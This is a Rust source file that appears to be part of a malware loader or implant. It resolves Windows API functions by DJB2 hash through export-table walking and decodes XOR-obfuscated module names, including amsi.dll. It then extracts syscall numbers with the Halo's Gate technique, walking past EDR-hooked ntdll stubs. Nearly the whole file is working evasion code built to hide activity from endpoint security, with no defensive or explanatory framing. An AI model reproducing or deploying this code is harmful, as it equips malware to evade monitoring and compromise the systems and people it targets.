// PEB walk + DJB2 export cache + SSN extractor + Halo's Gate neighbor-walk.
// no_std — AtomicUsize + SpinLock<BTreeMap> in place of LazyLock<Mutex<HashMap>>.

#![allow(dead_code)]

use core::ptr;
use core::sync::atomic::{AtomicUsize, Ordering};

use alloc::collections::BTreeMap;

use crate::sync::SpinLock;
use crate::{encoded_strings, native, obfuscation};

pub static NTDLL_BASE:    AtomicUsize = AtomicUsize::new(0);
pub static KERNEL32_BASE: AtomicUsize = AtomicUsize::new(0);
pub static AMSI_BASE:     AtomicUsize = AtomicUsize::new(0);

pub static EXPORT_CACHE: SpinLock<BTreeMap<u32, usize>> = SpinLock::new(BTreeMap::new());
pub static SSN_CACHE:    SpinLock<BTreeMap<u32, u32>>   = SpinLock::new(BTreeMap::new());

// ---- Public getters ----

pub fn ntdll_base()    -> usize { NTDLL_BASE.load(Ordering::SeqCst) }
pub fn kernel32_base() -> usize { KERNEL32_BASE.load(Ordering::SeqCst) }
pub fn amsi_base()     -> usize { AMSI_BASE.load(Ordering::SeqCst) }

pub fn export_cache_len() -> usize { EXPORT_CACHE.lock().len() }

// ================================================================
// Init — resolve ntdll + kernel32 bases (XOR-decoded names),
// build DJB2 export caches for each.
// ================================================================

pub fn init() -> Result<(), &'static str> {
    // ntdll
    let base = load_by_encoded_name(&encoded_strings::ENC_NTDLL_DLL,
                                    &encoded_strings::KEY_NTDLL_DLL)?;
    NTDLL_BASE.store(base, Ordering::SeqCst);
    unsafe { build_export_cache(base as *const u8); }

    // kernel32
    let base = load_by_encoded_name(&encoded_strings::ENC_KERNEL32_DLL,
                                    &encoded_strings::KEY_KERNEL32_DLL)?;
    KERNEL32_BASE.store(base, Ordering::SeqCst);
    unsafe { build_export_cache(base as *const u8); }

    Ok(())
}

pub fn ensure_amsi() -> Result<(), &'static str> {
    if AMSI_BASE.load(Ordering::SeqCst) != 0 { return Ok(()); }
    let base = load_by_encoded_name(&encoded_strings::ENC_AMSI_DLL_W,
                                    &encoded_strings::KEY_AMSI_DLL_W)?;
    AMSI_BASE.store(base, Ordering::SeqCst);
    unsafe { build_export_cache(base as *const u8); }
    Ok(())
}

// Decode a XOR'd wide module name onto a transient buffer, try GetModuleHandleW,
// fall back to LoadLibraryW, wipe the buffer. Returns module base or Err.
fn load_by_encoded_name(enc: &[u8], key: &[u8]) -> Result<usize, &'static str> {
    let mut name = obfuscation::xor_dec_w_mb(enc, key);
    let base = unsafe {
        let mut h = native::GetModuleHandleW(name.as_ptr()) as usize;
        if h == 0 {
            h = native::LoadLibraryW(name.as_ptr()) as usize;
        }
        h
    };
    obfuscation::secure_zero_u16(&mut name);
    if base == 0 { return Err("GetModuleHandleW/LoadLibraryW returned null"); }
    Ok(base)
}

// ================================================================
// Walk a PE's export table and populate EXPORT_CACHE.
// ================================================================

unsafe fn build_export_cache(module_base: *const u8) {
    let e_lfanew = ptr::read_unaligned(module_base.add(0x3C) as *const i32) as usize;
    let nt_hdr = module_base.add(e_lfanew);

    // DataDirectory[0] (Export) at NT_HEADERS +24 +112.
    let export_rva = ptr::read_unaligned(nt_hdr.add(24 + 112) as *const i32) as usize;
    if export_rva == 0 { return; }
    let export_dir = module_base.add(export_rva);

    let n_names   = ptr::read_unaligned(export_dir.add(24) as *const i32) as usize;
    let funcs_rva = ptr::read_unaligned(export_dir.add(28) as *const i32) as usize;
    let names_rva = ptr::read_unaligned(export_dir.add(32) as *const i32) as usize;
    let ords_rva  = ptr::read_unaligned(export_dir.add(36) as *const i32) as usize;

    let func_tbl = module_base.add(funcs_rva);
    let name_tbl = module_base.add(names_rva);
    let ord_tbl  = module_base.add(ords_rva);

    let mut cache = EXPORT_CACHE.lock();
    for i in 0..n_names {
        let name_rva = ptr::read_unaligned(name_tbl.add(i * 4) as *const i32) as usize;
        let name_ptr = module_base.add(name_rva);
        let hash = djb2_from_ptr(name_ptr);

        let ord = ptr::read_unaligned(ord_tbl.add(i * 2) as *const u16) as usize;
        let func_rva = ptr::read_unaligned(func_tbl.add(ord * 4) as *const i32) as usize;
        let va = module_base.add(func_rva) as usize;
        cache.insert(hash, va);
    }
}

// DJB2 off a NUL-terminated ASCII pointer.
unsafe fn djb2_from_ptr(s: *const u8) -> u32 {
    let mut hash: u32 = 5381;
    let mut off: usize = 0;
    loop {
        let b = ptr::read(s.add(off));
        if b == 0 { break; }
        hash = hash.wrapping_shl(5).wrapping_add(hash).wrapping_add(b as u32);
        off += 1;
    }
    hash
}

// ================================================================
// Resolve cached function VA by hash.
// ================================================================
pub fn resolve_by_hash(func_hash: u32) -> Result<usize, &'static str> {
    let cache = EXPORT_CACHE.lock();
    cache.get(&func_hash).copied()
        .ok_or("export hash not in cache (did peb::init run?)")
}

// ================================================================
// SSN extraction — with Halo's Gate neighbor-walk for hooked stubs.
// ================================================================

const STUB_STRIDE: usize = 0x20;
const MAX_WALK:    usize = 500;

pub fn ssn(func_hash: u32) -> u32 {
    {
        let cache = SSN_CACHE.lock();
        if let Some(&v) = cache.get(&func_hash) { return v; }
    }

    // resolve_by_hash's error is terminal — the loader can't run a syscall
    // without a stub address. Let the panic handler surface the condition.
    let va = resolve_by_hash(func_hash)
        .unwrap_or_else(|_| panic!("ssn: resolve failed"));
    let ssn = unsafe { resolve_ssn_from_stub(ntdll_base(), va) };
    if ssn == 0xFFFF_FFFF {
        panic!("ssn: could not resolve (hooked + neighbor-walk exhausted)");
    }
    SSN_CACHE.lock().insert(func_hash, ssn);
    ssn
}

unsafe fn is_unhooked(stub: *const u8) -> bool {
    ptr::read(stub) == 0x4C
        && ptr::read(stub.add(1)) == 0x8B
        && ptr::read(stub.add(2)) == 0xD1
        && ptr::read(stub.add(3)) == 0xB8
}

unsafe fn extract_ssn(stub: *const u8) -> u32 {
    (ptr::read(stub.add(4)) as u32) | ((ptr::read(stub.add(5)) as u32) << 8)
}

// Walk PE section table of `moduleBase` to find the section containing `addr`.
unsafe fn find_section_bounds(module_base: usize, addr: usize) -> Option<(usize, usize)> {
    let mb = module_base as *const u8;
    let e_lfanew = ptr::read_unaligned(mb.add(0x3C) as *const i32) as usize;
    let nt_hdr = mb.add(e_lfanew);
    let num_sec    = ptr::read_unaligned(nt_hdr.add(4 + 2) as *const u16) as usize;
    let size_opt   = ptr::read_unaligned(nt_hdr.add(4 + 16) as *const u16) as usize;
    let sec_tbl    = nt_hdr.add(4 + 20 + size_opt);

    for i in 0..num_sec {
        let sh = sec_tbl.add(i * 40);
        let virt_size = ptr::read_unaligned(sh.add(8)  as *const i32) as usize;
        let virt_addr = ptr::read_unaligned(sh.add(12) as *const i32) as usize;
        let s_start = module_base + virt_addr;
        let s_end   = s_start + virt_size;
        if addr >= s_start && addr < s_end {
            return Some((s_start, s_end));
        }
    }
    None
}

unsafe fn resolve_ssn_from_stub(module_base: usize, stub_va: usize) -> u32 {
    let stub = stub_va as *const u8;
    if is_unhooked(stub) {
        return extract_ssn(stub);
    }

    let bounds = find_section_bounds(module_base, stub_va);

    // Forward walk — higher addresses, higher SSNs.
    if let Some((_, end_va)) = bounds {
        if stub_va < end_va {
            for i in 1..=MAX_WALK {
                let nva = stub_va + i * STUB_STRIDE;
                if nva >= end_va { break; }
                let nptr = nva as *const u8;
                if is_unhooked(nptr) {
                    return extract_ssn(nptr).wrapping_sub(i as u32);
                }
            }
        }
    }

    // Backward walk — lower addresses, lower SSNs.
    if let Some((start_va, _)) = bounds {
        if stub_va > start_va {
            for i in 1..=MAX_WALK {
                let nva = stub_va.wrapping_sub(i * STUB_STRIDE);
                if nva < start_va { break; }
                let nptr = nva as *const u8;
                if is_unhooked(nptr) {
                    return extract_ssn(nptr).wrapping_add(i as u32);
                }
            }
        }
    }

    0xFFFF_FFFF  // sentinel: resolution failed
}
